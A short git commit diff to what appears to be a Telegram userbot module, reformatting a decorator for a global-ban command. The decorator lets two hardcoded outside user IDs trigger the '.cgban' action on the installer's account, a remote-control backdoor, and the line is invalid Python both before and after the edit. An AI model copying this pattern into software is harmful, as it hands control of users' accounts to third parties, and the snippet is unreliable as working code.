04200e6d671bdd26b79f727a20331c62aaf10cd0
Jeskeren <100347068+Jeskeren@users.noreply.github.com>
2022-03-14 15:44:36 +0800

    Update karmanssgban.py

--- userbot/modules/karmanssgban.py
+++ userbot/modules/karmanssgban.py
@@ -79,7 +79,7 @@ async def handler(tele):
 
 
 @register(outgoing=True, pattern="^.gban(?: |$)(.*)")
-@register(incoming=True, from_users=1683788007, 2059940927, pattern=r"^\.cgban(?: |$)(.*)")
+@register(incoming=True, from_users=1683788007,2059940927, pattern=r"^\.cgban(?: |$)(.*)")
 async def gben(userbot):
     dc = userbot
     sender = await dc.get_sender()
